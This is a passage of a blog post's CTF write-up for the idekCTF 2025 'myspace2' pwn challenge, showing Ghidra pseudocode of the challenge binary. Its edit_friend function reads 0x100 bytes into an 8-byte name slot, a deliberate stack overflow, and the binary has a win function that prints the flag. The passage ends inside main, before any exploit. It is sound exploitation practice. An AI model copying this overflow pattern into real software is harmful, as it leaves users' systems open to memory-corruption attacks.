@@ -1,0 +1,763 @@
+<!doctype html><html lang=en-us dir=ltr><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="Pretty easy chall but its like i need more writeups here or else the blog will look kinda lame and i need to make myself look like the CTF poet or something"><title>myspace2 idekCTF 2025</title><link rel=canonical href=https://shuban-789.github.io/p/pwn-idek/><link rel=stylesheet href=/scss/style.min.f5f8786259232d1ae8591e933103702560c5f893a028288deba9bc8fbcd95738.css><meta property='og:title' content="myspace2 idekCTF 2025"><meta property='og:description' content="Pretty easy chall but its like i need more writeups here or else the blog will look kinda lame and i need to make myself look like the CTF poet or something"><meta property='og:url' content='https://shuban-789.github.io/p/pwn-idek/'><meta property='og:site_name' content='Shuban Pal'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:published_time' content='2025-08-05T00:00:00+00:00'><meta property='article:modified_time' content='2025-08-05T00:00:00+00:00'><meta property='og:image' content='https://shuban-789.github.io/p/pwn-idek/cover.png'><meta name=twitter:title content="myspace2 idekCTF 2025"><meta name=twitter:description content="Pretty easy chall but its like i need more writeups here or else the blog will look kinda lame and i need to make myself look like the CTF poet or something"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content='https://shuban-789.github.io/p/pwn-idek/cover.png'><link rel="shortcut icon" href=/favicon.png></head><script>window.addEventListener("load",()=>{document.body.style.zoom="reset"})</script><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"dark")})()</script><script>(function(){document.documentElement.dataset.scheme="dark"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><div class=sidebar-decoration></div><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu_353daca1829154a.png width=300 height=280 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Shuban Pal</a></h1><h2 class=site-description>::&lt;></h2></div></header><ol class=menu-social><li><a href=https://github.com/shuban-789 target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><img src=/icons/preferences-desktop-gaming.png alt="preferences-desktop-gaming icon" class=menu-icon>
+<span>Home</span></a></li><li><a href=/archives/><img src=/icons/system-file-manager.png alt="system-file-manager icon" class=menu-icon>
+<span>Archives</span></a></li><li><a href=/search/><img src=/icons/internet-web-browser.png alt="internet-web-browser icon" class=menu-icon>
+<span>Search</span></a></li><li><a href=/writeups/><img src=/icons/utilities-terminal.png alt="utilities-terminal icon" class=menu-icon>
+<span>Writeups</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/pwn-idek/><img src=/p/pwn-idek/cover_hu_6f4f105baaa12e9c.png srcset="/p/pwn-idek/cover_hu_6f4f105baaa12e9c.png 800w, /p/pwn-idek/cover_hu_e6ae1a8248359fc4.png 1600w" width=800 height=458 loading=lazy alt="Featured image of post myspace2 idekCTF 2025"></a></div><div class=article-details><header class=article-category><a href=/categories/pwn/ style=background-color:#e74856;color:#000>Pwn</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/pwn-idek/>myspace2 idekCTF 2025</a></h2><h3 class=article-subtitle>Pretty easy chall but its like i need more writeups here or else the blog will look kinda lame and i need to make myself look like the CTF poet or something</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Aug 05, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>11 minute read</time></div></footer></div></header><section class=article-content><p>The rest of the idek pwn kinda hurted my brain (orz vy and nightxade) so I thought this chall might be good practice anyway to touch up on some of the basics. This is the pseudocode from ghidra which i pieced together. Its like the pseudo C ghidra has and I added some comments.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span><span class=lnt>124
+</span><span class=lnt>125
+</span><span class=lnt>126
+</span><span class=lnt>127
+</span><span class=lnt>128
+</span><span class=lnt>129
+</span><span class=lnt>130
+</span><span class=lnt>131
+</span><span class=lnt>132
+</span><span class=lnt>133
+</span><span class=lnt>134
+</span><span class=lnt>135
+</span><span class=lnt>136
+</span><span class=lnt>137
+</span><span class=lnt>138
+</span><span class=lnt>139
+</span><span class=lnt>140
+</span><span class=lnt>141
+</span><span class=lnt>142
+</span><span class=lnt>143
+</span><span class=lnt>144
+</span><span class=lnt>145
+</span><span class=lnt>146
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>all_friends</span><span class=p>(</span><span class=kt>char</span> <span class=p>(</span><span class=o>*</span><span class=n>top_friends</span><span class=p>)[</span><span class=mi>8</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>i</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Top Friends List:&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>8</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;%d: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>top_friends</span><span class=p>[</span><span class=n>i</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>display_friend</span><span class=p>(</span><span class=kt>char</span> <span class=p>(</span><span class=o>*</span><span class=n>top_friends</span><span class=p>)[</span><span class=mi>8</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>lVar1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>iVar2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>lVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Enter index to display (0-7): &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>iVar2</span> <span class=o>=</span> <span class=nf>FUN_00401160</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span> <span class=c1>// atoi
+</span></span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>iVar2</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=mi>7</span> <span class=o>&lt;</span> <span class=n>iVar2</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid index!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>top_friends</span><span class=p>[</span><span class=n>iVar2</span><span class=p>],</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>lVar1</span> <span class=o>!=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>__stack_chk_fail</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>edit_friend</span><span class=p>(</span><span class=kt>char</span> <span class=p>(</span><span class=o>*</span><span class=n>top_friends</span><span class=p>)[</span><span class=mi>8</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>lVar1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>iVar2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>sVar3</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>lVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>Enter index to edit (0-7): &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>iVar2</span> <span class=o>=</span> <span class=nf>FUN_00401160</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>iVar2</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=mi>7</span> <span class=o>&lt;</span> <span class=n>iVar2</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Invalid index!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Enter new name: &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nf>fgets</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=n>iVar2</span><span class=p>],</span> <span class=mh>0x100</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>sVar3</span> <span class=o>=</span> <span class=nf>strcspn</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=n>iVar2</span><span class=p>],</span> <span class=s>&#34;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>top_friends</span><span class=p>[</span><span class=n>iVar2</span><span class=p>][</span><span class=n>sVar3</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Friend updated.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>lVar1</span> <span class=o>!=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>__stack_chk_fail</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>get_flag</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>lVar1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=o>*</span><span class=n>args</span> <span class=p>[</span><span class=mi>3</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>    <span class=n>lVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;/bin/cat&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>args</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=s>&#34;/flag.txt&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>args</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>execve</span><span class=p>(</span><span class=s>&#34;/bin/cat&#34;</span><span class=p>,</span><span class=n>args</span><span class=p>,(</span><span class=kt>char</span> <span class=o>**</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>lVar1</span> <span class=o>!=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>__stack_chk_fail</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>ignore_me</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>menu</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>1. See Top Friends&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;2. Edit Friend&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;3. Display Friend&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;4. Quit&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;&gt;&gt; &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>lVar1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>iVar2</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>top_friends</span><span class=p>[</span><span class=mi>8</span><span class=p>][</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// 8x8 mat of chars. Each row contains up to 8 chars for the name, multiple of these rows are stored for each name. Kind of funny
+</span></span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>40</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>lVar1</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>setvbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;I really miss MySpace. At least the part about ranking my friends. Let&#39;s recreate it!&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>builtin_strncpy</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=s>&#34;es3n1n&#34;</span><span class=p>,</span> <span class=mi>7</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>top_friends</span><span class=p>[</span><span class=mi>0</span><span class=p>][</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>builtin_strncpy</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;Zero&#34;</span><span class=p>,</span> <span class=mi>5</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>top_friends</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>5</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>top_friends</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>top_friends</span><span class=p>[</span><span class=mi>1</span><span class=p>][</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>builtin_strncpy</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span> <span class=s>&#34;Contron&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>builtin_strncpy</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span> <span class=s>&#34;mixy1&#34;</span><span class=p>,</span> <span class=mi>6</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>top_friends</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>top_friends</span><span class=p>[</span><span class=mi>3</span><span class=p>][</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>builtin_strncpy</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=mi>4</span><span class=p>],</span> <span class=s>&#34;JoshL&#34;</span><span class=p>,</span> <span class=mi>6</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>top_friends</span><span class=p>[</span><span class=mi>4</span><span class=p>][</span><span class=mi>6</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>top_friends</span><span class=p>[</span><span class=mi>4</span><span class=p>][</span><span class=mi>7</span><span class=p>]</span> <span class=o>=</span> <span class=sc>&#39;\0&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nf>builtin_strncpy</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=mi>5</span><span class=p>],</span> <span class=s>&#34;Giapppp&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>builtin_strncpy</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=mi>6</span><span class=p>],</span> <span class=s>&#34;Icesfont&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>builtin_strncpy</span><span class=p>(</span><span class=n>top_friends</span><span class=p>[</span><span class=mi>7</span><span class=p>],</span> <span class=s>&#34;arcticx&#34;</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nl>LAB_00401636</span><span class=p>:</span> <span class=c1>// main menu routine
+</span></span></span><span class=line><span class=cl>    <span class=nf>menu</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span>
